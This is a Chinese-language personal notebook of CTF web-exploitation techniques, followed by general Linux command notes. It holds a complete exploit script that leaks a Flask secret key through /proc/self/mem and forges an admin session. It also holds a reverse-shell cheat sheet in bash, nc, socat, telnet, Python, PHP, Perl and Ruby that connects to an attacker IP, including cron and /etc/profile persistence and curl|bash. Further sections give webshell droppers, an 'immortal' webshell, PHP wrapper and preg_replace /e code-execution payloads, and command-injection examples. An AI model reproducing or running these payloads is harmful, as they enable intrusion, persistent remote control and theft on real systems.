**这个fd比较重要，因为在Linux系统中，如果一个程序用 open() 打开了一个文件，但是最终没有关闭它，即使从外部（如：os.remove(SECRET_FILE))删除这个文件之后，在`/proc`这个进程的 `pid`目录下的`fd`文件描述符 目录下 还是会有这个文件的文件描述符，通过这个文件描述符我们即可以得到被删除的文件的内容**

/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。

/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。

例题：[攻防世界catcat-new](https://adworld.xctf.org.cn/challenges/write-up?hash=9cc7514c-7c47-11ed-ab28-000c29bc20bf&task_category_id=3)

使用/proc/self/maps得到内存映射：55a7c2545000-55a7c2546000 rw

得到这个可以使用 

```
map_addr = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
```

来匹配；

然后再将16进制转换为10进制

```
start = int(map_addr.group(1), 16)
end = int(map_addr.group(2), 16)
```

再配合mem来获取内容

```
?file=../../../proc/self/mem&start={start}&end={end}
```

列题完整代码：

```python

import requests
import re
import ast, sys
from abc import ABC
from flask.sessions import SecureCookieSessionInterface


url = "http://61.147.171.105:60014/"

#此程序只能运行于Python3以上
if sys.version_info[0] < 3: # < 3.0
    raise Exception('Must be using at least Python 3')

#----------------session 伪造,单独用也可以考虑这个库： https://github.com/noraj/flask-session-cookie-manager ----------------
class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key
        
class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            #Encode a Flask session cookie
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e
#-------------------------------------------



#由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self/mem来获取secret key
s_key = ""
bypass = "../.."
#请求file路由进行读取
map_list = requests.get(url + f"info?file={bypass}/proc/self/maps")
map_list = map_list.text.split("\\n")
for i in map_list:
    #匹配指定格式的地址
    map_addr = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)
    if map_addr:
        start = int(map_addr.group(1), 16)
        end = int(map_addr.group(2), 16)
        print("Found rw addr:", start, "-", end)
        
        #设置起始和结束位置并读取/proc/self/mem
        res = requests.get(f"{url}/info?file={bypass}/proc/self/mem&start={start}&end={end}")
        #用到了之前特定的SECRET_KEY格式。如果发现*abcdefgh存在其中，说明成功泄露secretkey
        if "*abcdefgh" in res.text:
            #正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh
            secret_key = re.findall("[a-z0-9]{32}\*abcdefgh", res.text)
            if secret_key:
                print("Secret Key:", secret_key[0])
                s_key = secret_key[0]
                break

#设置session中admin的值为1
data = '{"admin":1}'
#伪造session
headers = {
    "Cookie" : "session=" + FSCM.encode(s_key, data)
}
#请求admin路由
try:
    flag = requests.get(url + "admin", headers=headers)
    print("Flag is", flag.text)
except:
    print("Something error")
```





## 4.[反弹shell](https://xz.aliyun.com/t/9488)

https://xz.aliyun.com/t/9488

### 1.nc反弹shell

**攻击机开启本地监听：**

```
netcat -lvvp 2333
```

**目标机主动连接攻击机：**

```
netcat 47.xxx.xxx.72 2333 -e /bin/bash
# nc <攻击机IP> <攻击机监听的端口> -e /bin/bash
```

### 2.bash反弹

**攻击机开启本地监听：**

```
nc -lvvp 2333
```

**目标机主动连接攻击机：**

```
bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
```

以下是针对Bash反弹一句话进行了拆分说明：

| 命令                        | 命令详解                                                     |
| --------------------------- | ------------------------------------------------------------ |
| bash -i                     | 产生一个bash交互环境。                                       |
| >&                          | 将联合符号前面的内容与后面相结合，然后一起重定向给后者。     |
| /dev/tcp/47.xxx.xxx.72/2333 | Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。 |
| 0>&1                        | 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。 |

### 3.Curl配合Bash反弹shell

这里操作也很简单，借助了Linux中的管道。

首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：

```
bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1
```

并开启2333端口的监听。

然后再目标机上执行如下，即可反弹shell：

```
curl 47.xxx.xxx.72|bash
```

Curl配合Bash反弹shell的方式在CTF题目中经常出现，`curl IP|bash` 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。

### 4.将反弹shell的命令写入定时任务

我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 `/var/spool/cron/[crontabs]/<username>` 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。

比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/root 中。(centos系列主机)

比如，当前用户名为root，我们就要将下面内容写入到 /var/spool/cron/crontabs/root 中。(Debian/Ubuntu系列主机)

```
*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/47.xxx.xxx.72/2333 0>&1

#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell
```

### 5.将反弹shell的命令写入/etc/profile文件

将以下反弹shell的命写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行。

```
/bin/bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 &
# 最后面那个&为的是防止管理员无法输入命令
```

当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell

### 6.利用Socat反弹shell

Socat是Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，不过据说可以看做netcat的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参见这里：http://brieflyx.me/2015/linux-tools/socat-introduction/

安装Socat的方法很简单：

- Ubuntu等可以直接使用 `apt-get install socat` 命令进行安装
- 也可以去官网下载源码包：http://www.dest-unreach.org/socat

**攻击机开启本地监听：**

```
socat TCP-LISTEN:2333 -
或
nc -lvvp 2333
```

**目标机主动连接攻击机：**

```
socat tcp-connect:47.xxx.xxx.72:2333 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

### 7.利用Telnet反弹shell

当nc和/dev/tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以使用Telnet反弹shell。

### 方法一

**攻击机开启本地监听：**

```
nc -lvvp 2333
```

**目标机主动连接攻击机：**

```
mknod a p; telnet 47.xxx.xxx.72 2333 0<a | /bin/bash 1>a
```

### 方法二

**攻击机需要开启两个本地监听：**

```
nc -lvvp 2333
nc -lvvp 4000
```

**目标机主动连接攻击机：**

```
telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000
```

在攻击机2333端口的终端上输入的命令会在目标机上执行，执行的回显将通过4000端口的终端显示出来。

### 各种脚本反弹shell

#### Python 脚本反弹shell

当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。

**攻击机开启本地监听：**

```
nc -lvvp 2333
```

**目标机主动连接攻击机：**

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.xxx.xxx.72",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### php 脚本反弹shell

当目标主机上有php环境时，我们可以用php来反弹shell。

**攻击机开启本地监听：**

```
nc -lvvp 2333
```

**目标机主动连接攻击机：**

```
php -r '$sock=fsockopen("47.xxx.xxx.72",2333);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Perl 脚本反弹shell

当目标主机上有perl环境时，我们可以用perl来反弹shell。

**攻击机开启本地监听：**

```
nc -lvvp 2333
```

**目标机主动连接攻击机：**

```
perl -e 'use Socket;$i="47.101.57.72";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Ruby脚本反弹shell

当目标主机上有ruby环境时，我们可以用ruby来反弹shell。

**攻击机开启本地监听：**

```
nc -lvvp 2333
```

**目标机主动连接攻击机：**

```
ruby -rsocket -e 'c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
或
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("47.xxx.xxx.72","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```



## 5.PHP伪协议

​	PHP伪协议详解过滤器



php支持的伪协议

```php
1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流
123456789101112
```

### 1 php://filter

php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。

简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。

**php://filter**可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。

协议参数

| 名称                        | 描述                                                         |
| --------------------------- | ------------------------------------------------------------ |
| `resource=<要过滤的数据流>` | 这个参数是必须的。它指定了你要筛选过滤的数据流。             |
| `read=<读链的筛选列表>`     | 该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔。 |
| `write=<写链的筛选列表>`    | 该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔。 |
| `<；两个链的筛选列表>`      | 任何没有以 `read=` 或 `write=` 作前缀 的筛选器列表会视情况应用于读或写链。 |

常用：

```php
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php
12
```

利用filter协议读文件±，将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。

而使用的convert.base64-encode，就是一种过滤器。

### 过滤器

[各种绕过](https://blog.csdn.net/qq_44657899/article/details/109300335)

#### 字符串过滤器

该类通常以`string`开头，对每个字符都进行同样方式的处理。

**string.rot13**

一种字符处理方式，字符右移十三位。

**string.toupper**

将所有字符转换为大写。

**string.tolower**

将所有字符转换为小写。

#### string.strip_tags

这个过滤器就比较有意思，用来处理掉读入的所有标签，例如XML的等等。在绕过死亡exit大有用处。

#### 转换过滤器

对数据流进行编码，通常用来读取文件源码。

**convert.base64-encode & convert.base64-decode**

base64加密解密

**convert.quoted-printable-encode & convert.quoted-printable-decode**

可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。

#### 压缩过滤器

注意，这里的压缩过滤器指的并不是在数据流传入的时候对整个数据进行写入文件后压缩文件，也不代表可以压缩或者解压数据流。压缩过滤器**不**产生命令行工具如 `gzip`的头和尾信息。只是压缩和解压数据流中的有效载荷部分。

用到的两个相关过滤器：`zlib.deflate`（压缩）和 `zlib.inflate`（解压）。zilb是比较主流的用法，至于`bzip2.compress`和 `bzip2.decompress`工作的方式与 [zlib](https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020) 过滤器大致相同。

#### 加密过滤器

`mcrypt.*`和 `mdecrypt.*`使用 libmcrypt 提供了对称的加密和解密。

更多妙用：https://www.leavesongs.com/PENETRATION/php-filter-magic.html

### 利用filter伪协议绕过死亡exit

#### 什么是死亡exit

死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：

```php
file_put_contents($content, '<?php exit();' . $content);
1
```

亦或者

```php
file_put_contents($content, '<?php exit();?>' . $content);
1
```

这样，当你插入一句话木马时，文件的内容是这样子的：

```php
<?php exit();?>

<?php @eval($_POST['snakin']);?>
123
```

这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。

#### base64decode绕过

利用filter协议来绕过，看下这样的代码：

```php
<?php

$content = '<?php exit; ?>';

$content .= $_POST['txt'];

file_put_contents($_POST['filename'], $content);
1234567
```

当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。

然而这里可以利用php://filter的base64-decode方法，将`$content`解码，利用php base64_decode函数特性去除死亡exit。

base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，这个时候base64就相当于以下的过程：

```php
<?php

$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);

base64_decode($_GET['txt']);
12345
```

所以，当`$content` 包含 `<?php exit; ?>`时，解码过程会先去除识别不了的字符，< ; ? >和空格等都将被去除，于是剩下的字符就只有`phpexit`以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。

这个时候后面再加上编码后的一句话木马，就可以getshell了。

#### strip_tags绕过

这个`<?php exit; ?>`实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。

但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。

注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。

```php
php://filter/string.strip_tags|convert.base64-decode/resource=shell.php
1
```

更多绕过方法：[file_put_content和死亡·杂糅代码之缘](https://xz.aliyun.com/t/8163#toc-2)

### 2 data://

数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。

示例用法：

```php
1、data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 
2、data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
12345
```

### 范例

Example #1 打印 data:// 的内容

```php
<?php
// 打印 "I love PHP"
echo  file_get_contents ( 'data://text/plain;base64,SSBsb3ZlIFBIUAo=' );
?>
1234
```

Example #2 获取媒体类型

```php
<?php
$fp    =  fopen ( 'data://text/plain;base64,' ,  'r' );
$meta  =  stream_get_meta_data ( $fp );

// 打印 "text/plain"
echo  $meta [ 'mediatype' ];
?>
1234567
```

### 3 file://

用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响
file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)
比如：http://www.xx.com?file=file:///etc/passsword

### 4 php://

在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用
php://作用为访问输入输出流

### 5 php://input

**php://input**可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。

例如：
http://127.0.0.1/cmd.php?cmd=php://input
POST数据：<?php phpinfo()?>
注意：
当enctype="multipart/form-data"的时候 php://input` 是无效的

遇到file_get_contents()要想到用php://input绕过。

### 6 zip://

zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。

```
zip://中只能传入绝对路径。
要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
只需要是zip的压缩包即可，后缀名可以任意更改。
相同的类型的还有zlib://和bzip2://
1234
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2019021218350876.png)

参考链接：

[php伪协议实现命令执行的七种姿势](https://www.freebuf.com/column/148886.html)

[PHP伪协议总结](https://segmentfault.com/a/1190000018991087)

## 6.正则匹配绕过





## 7.preg_replace()正则替换/e漏洞



通俗来说：

```
preg_replace ( mixed $pattern , mixed $replacement , mixed $subject)
中，
pattern是匹配的模式和规则
$subject: 要搜索替换的目标字符串或字符串数组。
$replacement: 用于替换的字符串或字符串数组。

pattern中有/i,/e,等等模式，其中/i是 不区分大小写，而/e就表示将replacement当php代码执行，因此就会触发代码执行漏洞
```

也就是说只要在subject中有要搜索的pattern的内容，同时将在replacement前加上/e，触发/e漏洞，就可以执行replacement中的正确的php代码

```
if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }
 else{
        die();
    }
    
 因此可构建?pat=/abc/e&rep=system("ls")&sub=abc
 便可触发；
```

当然还有[更复杂的利用方式](https://blog.csdn.net/Reme_mber/article/details/124185032?ops_request_misc=&request_id=&biz_id=102&utm_term=preg_replace%20/e%E6%BC%8F%E6%B4%9E&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-124185032.142^v73^pc_new_rank,201^v4^add_ask,239^v2^insert_chatgpt&spm=1018.2226.3001.4187)：

```php
<?php
function test($str){}
echo preg_replace("/s*(.*)s*/ies", "\\1", $_GET["h"]);
show_source(__FILE__);
?> 
s*表示空格，（.*）表示所有字符 \1 表示反向引用，也就是${}里面的内容；
   可直接构造?h=${phpinfo()}
```





## 8.ping与管道符集合形成命令执行漏洞

有一些页面提供ping url的功能，通常使用127.0.0.1来测试；

这时候就可以使用 127.0.0.1|whoami来实现命令注入；

漏洞原理：
服务端处理ping的代码如下所示，程序获取GET参数IP，然后拼接到system函数中，利用system函数执行ping的功能，但是此处没有对参数IP做过滤和检测，导致可以利用管道符执行其他的系统命令，代码如下所示。

```
echo system("ping -n 2".$Get(ip))
```

**Windows系例支持的管道符如下所示。**

“|”：直接执行后面的语句。例如：ping 127.0.0.1|whoami。

“||”：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如：ping 2||whoami。

“&”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1&whoami。

“&&”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1&&whoami。

**Linux系统支持的管道符如下所示。**

“;”：执行完前面的语句再执行后面的。例如：ping 127.0.0.1;whoami。

“|”：显示后面语句的执行结果。例如：ping 127.0.0.1|whoami。

“||”：当前面的语句执行出错时，执行后面的语句。例如：ping 1||whoami。

“&”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1&whoami。

“&&”：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如：ping 127.0.0.1&&whoami。



## webshell 后门木马命令

```php
<?php
fputs(fopen("shell.php","w"),'<?php eval($_POST[123]);?>');
?>

<?php
system("echo PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg== | base64 -d >shell.php & ls");
?>
    
   // <?php @eval($_POST[1]);?>
    

```

不死马

```php
<?php ignore_user_abort(true); set_time_limit(0); unlink(__FILE__); $file = '.shell.php'; $code = '<?php if(md5($_GET["pass"])=="2591c98b70119fe624898b1e424b5e91"){@system($_POST[cmd]);} ?>';
while (1){
file_put_contents(f i l e , file,file,code);
}
?>
```



## 9.GC回收机制





# 命令大全

查看当前系统所有进程，包括服务，PID

```
ps -ef
```

查看某个开放端口命令

```
netstat -tnlp | grep 8080
或者
lsof -i:8080
```



scp

命令行软件中将远程文件下载到本地

例如，要将本地文件`file.txt`复制到远程计算机`remote_host`的`/home/user/`目录下，可以使用以下命令：

```
ruby
scp file.txt user@remote_host:/home/user/
```

如果要从远程计算机复制文件到本地计算机，可以将源路径和目标路径交换，例如：

```
ruby
scp user@remote_host:/home/user/file.txt .
```

这将把远程计算机上的`file.txt`文件复制到当前目录下。



## docker操作

docker容器小知识：

```
容器就是一层一层的结构，比如说在dockerfile中有一个命令Run，这就有一层，当创建一个docker容器时，会为该容器创建一个可读层（放在merged中)和一个可写层（diff),当我们要修改容器中的文件时，我们只需要修改diff里面的就行；ChatGPT的回答如下

问：
但是merged中的文件和diff中的文件不一致怎么办？比如说，我运行了一个容器，下面有app.js，然后我修改了diff下的app.js，并重启容器，那么这将导致merged和diff下的app.js不同。为什么容器还可以正常运行呢，重新运行后的容器以哪个版本的app.js为准呢？

答：
在 Docker 中，当您重启容器时，Docker 会重新加载最新的可写层，也就是 diff 目录中的内容。因此，容器运行时使用的是最新的 app.js 文件，而不是 merged 中的版本。

容器重启时，Docker 会从原始镜像和最新的 diff 层重新生成容器的文件系统，并重新挂载到容器中。因此，merged 中的 app.js 文件实际上已经不再被使用，只是被保留在磁盘上，不会对容器的运行产生影响。

如果您想要在 merged 和 diff 目录中同步 app.js 文件，可以使用 docker cp 命令将修改后的 app.js 文件从容器中复制到宿主机上，并手动将其复制到 merged 目录中。这样做可以保证 merged 和 diff 目录中的文件保持同步。不过，需要注意的是，对于只读的 merged 目录中的文件进行更改是不被推荐的，因为这会破坏原始镜像的一致性和可移植性。
```

进入容器

```
docker exec -it  容器id /bin/bash
```

退出容器

```
在容器内按ctrl +P+Q
```



## Linux

sudo -l 可以查看当前用户下的权限；哪些文件有些什么权限；

## Find命令

查找某段字符在哪个文件

```
find / -name "*.py" -type f | xargs grep "Remote connections are forbidden"
表示在后缀名为py的所有文件中搜索含有字符"Remote connections are forbidden"的文件
```

#### 1、根据文件名查找

参数

```yaml
-name "文件名称": 区分大小写，支持使用glob 通配符 * ? []  [^]
            
-iname "文件名称"：不区分字母大小写
                    
-path "/path/name" : 匹配某个文件或目录的完整路径，而不仅仅是匹配文件名
12345
```

示例：

```yaml
# 查找 /usr 目录下所有文件名以 .txt 结尾的文件
find /usr -name '*.txt'

#查找 /usr 目录下所有文件名刚好为 4 个字符的文件
find /usr -name '????'

#查找 /usr 下所有文件名以 .txt 结尾的文件或目录，且该文件的父目录必须是 src
find /usr -path '*/src/*.txt'	

123456789
```

#### 2、根据文件类型查找

```yaml
-type 类型
    f：普通文件
    d：目录文件
    l：符号链接文件
    s：套接字文件
    b：块设备文件
    c：字符设备文件
    p：管道文件
    
# 检索 /usr 下所有文件名以 python 开头的目录
find /usr -type d -name 'python*'
1234567891011
```

#### 3、根据文件大小来查找

```yaml
-size [+|-] #Unit

#Unit常用单位：K M G
#+ 或 - 符号表示大于或小于当前条件

#Unit : （#-1，#]
-#Unit : [0,#-1] : 小于指定大小文件
+#Unix : (#,) : 大于指定大小文件

# 查找大于100M的文件
find / -size +100M 
1234567891011
```

#### 4、根据时间戳查找

```yaml
Linux 系统中，与文件相关联的时间参数有以下三种：

修改时间（Modification time）：最后一次文件内容有过更改的时间点
访问时间（Access time）：最后一次文件有被读取过的时间点
变更时间（Change time）：最后一次文件有被变更过的时间点（如内容被修改，或权限等 metadata 被修改）

与此对应的是 find 命令中的 -mtime，-atime 和 -ctime 三个选项

以"天"为单位
    -atime [+|-]#
        #: [#,#+1) : 这里的#表示#天之前的“一天之内”被访问过的文件
        +#: [#+1,OO]: 列出在#天之前（不包含#天本身）被访问过的文件
        -#: [0,#) : 列出在#天之内（包含#天本身）被访问过的文件
        
    -mtime [+|-]
    -ctime [+|-]

以"分钟"为单位
    -amin
    -mmin
    -cmin
    
# 查找两天之前的一天内被访问的文件（距离现在的前48 ~ 72 小时之间）
find -atime  2 

# 查找距离此时2天内被访问的文件（距离现在前48小时之内）
find -atime -2 

# 两天之前，不包括两天之前的一天的被访问的文件（离此时72小时之前）
find -atime +2 
123456789101112131415161718192021222324252627282930
```

#### 5、根据文件的所属权

```yaml
-user username ：查找属主为指定用户的文件
-group groupname ：查找指定属组的文件

-uid userid：查找属主为指定uid号的文件
-gid groupid 查找属组为指定gid号的文件

-nouser ：查找没有属主的文件
-nogroup : 查找没有属组的文件

# 查找/var目录下属主为root，且属组为mail的所有文件或目录、
find /var -user root -a -group mail
1234567891011
```

#### 6、根据权限查找

```yaml
-perm [+|-] Mode
Mode : 精确权限匹配            
+Mode ：任何一类(u,g,o)对象的权限中只要有一位匹配即可
-Mode ：完全包含此mode时才可以匹配,每一类对象都必须同时拥有为其指定的权限标准


# 查找在/tmp目录下权限是755的文件
find  /tmp  -perm  755           

# 表示必须所有类别用户都满足有写权限
find  /tmp  -perm  -222        

# 表示只要有一类用户（属主，属组，其他）的匹配写权限就行
find  /tmp  -perm  +222

123456789101112131415
```

#### 7、逻辑组合

```yaml
与 -a
或 -o
非 -not

!A -a !B = !(A -o B)
!A -o !B = !(A -a B)


# 查找/etc目录下最近一周内其内容修改过，且属主不为root，也不是hadoop的文件或目录
 find /etc -mtime -7 -not \( -user root -o -user hadoop \)
 
 # 查找5分钟内或50分钟前被修改 ，并且 类型为文件的 所有文件
 find / '(' -mmin -5 -o -mtime +50 ')' -a -type f

1234567891011121314
```

### 三、处理动作

#### 1、常用处理动作

```yaml
-print ：默认的处理动作，显示至屏幕

-ls ：类似于对查找到的文件执行 "ls -l"命令

-delete ：删除查找到的文件

-fls /path/to/somefile ：查找到的所有文件的长格式信息保存至指定文件中

# 其中的大括号{}作为检索到的文件的 占位符 ，用于引用查找到的文件名称自身
# 而分号（ ;）作为命令结束的标志, 需要转义 , 也可以用 + 号表示
# -exec command {} \;  等同于 -exec command {} +


-ok command {} \; 
	对查找到的每个文件执行由command指定的命令
    对于每个文件执行命令之前，都会交互式要求用户确认
    
-exec command {} \; 
	对查找到的每个文件执行由command指定的命令


# 浏览所有 1G 以上大小的文件的详细信息
find / -type file -size +1G -ls 

# 删除 home 目录下所有的空目录：
find ~ -type d -empty -delete

# 删除/var下空文件
find /var -size 0 -type f -exec rm -rf {} \;


12345678910111213141516171819202122232425262728293031
```

#### 2、删除大量文件

```yaml
# 删除海量文件，rm会很慢甚至卡死
# 一般用 find 或 rsync 来删除大量文件
# rsync 速度快于 find

# 可以用 time 测试速度
#time find ./ -type f -delete     
find ./ -type f -delete  

#  test  time find ./ -type f -exec rm {} \;
find ./ -type f -exec rm {} \;  

# 使用rsync进行删除
# 首先建立空文件夹blanktest
# time rsync -a --delete blanktest/ test/
rsync -a --delete blanktest/ test/ 
123456789101112131415
```

#### 3、find 结合 [xargs](https://so.csdn.net/so/search?q=xargs&spm=1001.2101.3001.7020)

**注意：**

> find 传递查找到文件至后面指定的命令时，查找到所有符合条件的文件一次性传递给后面的指令
> 有些命令不能接受过多参数，此时命令执行可能会失败，另一种方式可规避此问题
>
> find | xargs command

**xargs 介绍**

> xargs（英文全拼： eXtended ARGuments）是给命令传递参数的一个过滤器，也是组合多个命令的一个工具。
>
> xargs 可以将管道或标准输入（stdin）数据转换成命令行参数，也能够从文件的输出中读取数据。

**在指定路径下查找含有指定字符串的文件**

```yaml
# 将find查找的所有文件 作为参数传递给 grep进行过滤
find /path | xargs grep -ri "string" 
12
```

### 四、常用示例

```yaml
# 查找大于200M的文件，并显示具体大小
find / -type f -size +200M 2>/dev/null | xargs du -sh

# 查找大于200M的文件，并显示详细信息
find / -type f -size +200M 2>/dev/null | xargs ls -l

# 查找系统中 最大的 10 个文件
find / -type f -exec du -sh {} + 2>/dev/null | sort -rh | head -n 10

# 查找 /etc 下 文件内包含 "password" 的文件
find /etc | xargs grep -ri "password" 

# 遍历查找所有目录下的 Inode数量
for i in /*; do echo $i; find $i  2>/dev/null | wc -l; done

# 删除大与100M，时间在7天前的文件
find /test -size +100M -mtime +7 -delete
```













## 端口操作

### lsof

查看正在运行有进程的端口

```
lsof -iTCP -sTCP:LISTEN -P
指定端口：lsof -i:80
```

### netstat

查看正在运行的端口

```
netstat -antl
```

### firewalld打开端口

```
启动： systemctl start firewalld
查看所有打开的端口： firewall-cmd–zone=public --list-ports
打开端口：firewall-cmd --zone=public --add-port=80/tcp --permanent
重新载入：firewall-cmd --reload
删除：firewall-cmd --zone=public --remove-port=80/tcp --permanent
```

`firewall-cmd --zone=public --list-ports` 命令只会显示在防火墙规则中手动添加的端口，不会显示已经被占用的端口。

如果想要查看所有已经被占用的端口和对应的进程，可以使用 `netstat` 命令。例如：

```
netstat -tlnp
```

该命令将列出所有当前正在运行的TCP端口和进程的详细信息，包括本地IP地址、端口、远程IP地址、远程端口和所属进程的名称。











## curl命令

### 1、发送GET请求

```bash
curl URL
curl URL?a=1&b=nihao
```

### 2、发送POST请求

```bash
curl -X POST -d 'a=1&b=nihao' URL
```

### 3、发送json格式请求：

```bash
curl -H "Content-Type: application/json" -X POST -d '{"abc":123,"bcd":"nihao"}' URL
curl -H "Content-Type: application/json" -X POST -d @test.json URL
```

其中，**-H**代表header头，**-X**是指定什么类型请求(POST/GET/HEAD/DELETE/PUT/PATCH)，**-d**代表传输什么数据。这几个是最常用的。

查看所有curl命令： man curl或者curl -h
请求头：H,A,e
响应头：I,i,D
cookie：b,c,j
传输：F(POST),G(GET),T(PUT),X
输出：o,O,w
断点续传：r
调试：v,--trace,--trace-ascii,--trace-time



## grep

### 由普通字符和正则表达式的元字符组构成的条件

**简单例子**

```
grep "root" /etc/passwd
```

![img](https://img-blog.csdnimg.cn/20190123204009457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

### 正则表达式的元字符

### （1）匹配单个字符的元字符

**. 任意单个字符（前面是一个小点）**

```
grep "r..t" /etc/passwd
```

 **注意：.  代表任意字符，此处有两个 . ，代表两个任意字符，看下面的例子**

![img](https://img-blog.csdnimg.cn/20190123204437689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

 **[ ]  代表或者的关系**

